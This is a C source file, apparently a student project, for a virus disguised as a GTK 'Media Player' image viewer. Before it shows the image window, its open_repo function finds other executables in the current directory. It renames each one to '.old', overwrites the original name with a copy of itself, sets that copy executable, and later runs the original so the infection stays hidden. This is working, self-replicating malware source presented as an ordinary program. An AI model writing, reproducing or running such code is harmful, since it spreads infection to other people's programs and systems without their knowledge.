#include <gtk/gtk.h>
#include <dirent.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

void open_repo(char * directory,char * argv[]){
    DIR * dp; // we initialize variables for iterating through the differents files in the current directory
    struct dirent * dirp;
    dp = opendir(directory);
    char * arg= argv[0];
    char fn[255];
    strncpy(fn,&arg[2],255); //we pass the name of the actual executed file into a buffer
    while ((dirp = readdir(dp)) != NULL){ //iterating through the current directory
        struct stat buf;
        stat(dirp->d_name,&buf); // extracting the permissions of the pointed file
        int test = buf.st_mode;
        int cmp = strcmp(dirp->d_name,"MediaPlayer"); // comparing the pointed file with MediaPlayer to avoid problems linked to the first exec of the virus such as 
        // over infection
        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)&&((cmp!=0))){ //we cehck 4 things : if it's executable, if it's a regular file
            // if it's not a .old file ( they are considered as regular file ) and if it's not MediaPlayer because of what I say just before
            //So if it's an exe we can continue
            printf(".exe");
            DIR * dp_2;
            struct dirent * dirp_2; 
            dp_2 = opendir(directory);
            char * cp = (char *) malloc( strlen(dirp->d_name) ); // we make a copy of the d_name because using dirp->d_name in rename doesn't work, thanks C
            strcpy(cp,dirp->d_name);
            strcat(dirp->d_name,".old"); //we add .old to the pointer of the filename
            int res=0;
            while ((dirp_2 = readdir(dp_2)) != NULL){ //we reiterate through the current repo to see if there isn't a .old file of the actual pointed program 
            //in the directory if we find a occurence we break the loop and it won't pass the condition else we can continue the processus of infection
                if ((strcmp(dirp->d_name,dirp_2->d_name))==0)
                {
                    res = 1;
                    break;
                }
            }
            if (res == 0){
                printf("\tnot infected");
                printf("\t%s",dirp->d_name);
                int re = rename(cp,dirp->d_name); // we rename the actual into <program_name>.old
                printf("\t%d",re);
                FILE * f = fopen(fn,"rb"); //we try to open the actual file executed
                if (f==NULL){
                    printf("\n pas read");
                }
                FILE * g = fopen(cp,"wb"); //we try to create and open for writing a new file with the pointed program name
                if (f==NULL){
                    printf("\n pas ecrire");
                }
                fseek(f, 0L, SEEK_END); //we place the reading pointer to the last character
                int sz = ftell(f); //we recover the position of the reading pointer to know the size of the file
                printf("\t size :%d \t",sz);
                char buf[sz]; //creating a buffer with the size of the file
                int x; 
                fseek(f, 0L, SEEK_SET); //we replace the reading pointer to the beginning of the file
                while((x = fread(buf, 1, sz, f) != 0)){  // we iterate threw each character of the file and recover the block number
                    if(fwrite(buf, 1, sz, g) != x){ //if the block number returned by fwrite is different from fread we break the loop 
                        break; 
                        } 
                }
                fclose(f);
                fclose(g); //closing the file
                chmod(cp,0755); //change the autorisation of the created file to make it executable ( it's actually the basic chmod for a directory should put 0731
                //but meh)
                

            }else{
                printf("already infected");
            }
        }/*
        else if ((test & S_IXUSR) && (test & S_IFDIR)){
            if(!(dirp->d_name[0]=='.')){
                char * cp = (char *) malloc( strlen(dirp->d_name) );
                strcpy(cp,dirp->d_name);
                //open_repo(dirp->d_name);
            }
            else{
                printf("nope");
            }
        }*/
    }
    closedir(dp);
    if((strcmp(fn,"MediaPlayer")!=0)){ //if the name of the actual executed file isn't MediaPlayer we execute the "true" program 
                    execve(strcat(fn,".old"),NULL,NULL);
                }
}

int main(int argc, char * argv[]){
    //lauching infection fonction, passing the current directory and argv as parameters
    open_repo(".", argv);
    const int Width = 1920, Height = 1080;
    char *buffer = (char*)malloc(3 * Width * Height);

    GtkWidget * window;
    GtkWidget * image;

    gtk_init (&argc, &argv);
    window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title (GTK_WINDOW (window), "Media Player");
    image = gtk_image_new_from_file(argv[1]);
    gtk_container_add(GTK_CONTAINER (window), image);

    gtk_widget_show_all (window);

    gtk_main ();

    free (buffer);
    return 0;
}